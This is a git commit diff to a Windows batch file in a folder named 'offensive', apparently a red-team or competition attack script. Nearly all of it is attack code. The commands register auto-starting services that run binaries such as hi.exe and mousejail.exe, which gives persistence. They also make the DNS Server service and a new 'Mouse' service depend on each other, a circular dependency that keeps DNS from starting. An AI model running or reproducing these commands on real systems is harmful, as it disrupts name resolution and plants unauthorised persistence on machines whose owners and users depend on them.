9770fd3cc324cc893bf4ec4323b3f5a4a7d5e3ba
rhea80 <rheaa181@gmail.com>
2026-02-16 18:51:46 -0500

    Update...

--- offensive/metal_chocobo.bat
+++ offensive/metal_chocobo.bat
@@ -1,2 +1,10 @@
-sc.exe create "RELEASE KINGDOM HEARTS IV" binPath = "C:\real.exe" start=auto
+sc.exe create "RELEASE KINGDOM HEARTS IV" binPath = "C:\offensive\compiled_exes\hi.exe" start=auto
+sc.exe config "RELEASE KINGDOM HEARTS IV" depend=DNS Server
+
+sc.exe create "Mouse" binPath = "C:\offensive\compiled_exes\mousejail.exe" start=auto
+sc.exe config "Mouse" depend=DNS Server
+sc.exe config "DNS Server" depend=Mouse
+
+
+sc.exe create "RELEASE KINGDOM HEARTS IV" binPath = "C:\offensive\compiled_exes\hi.exe" start=auto
 sc.exe config "RELEASE KINGDOM HEARTS IV" depend=DNS Server
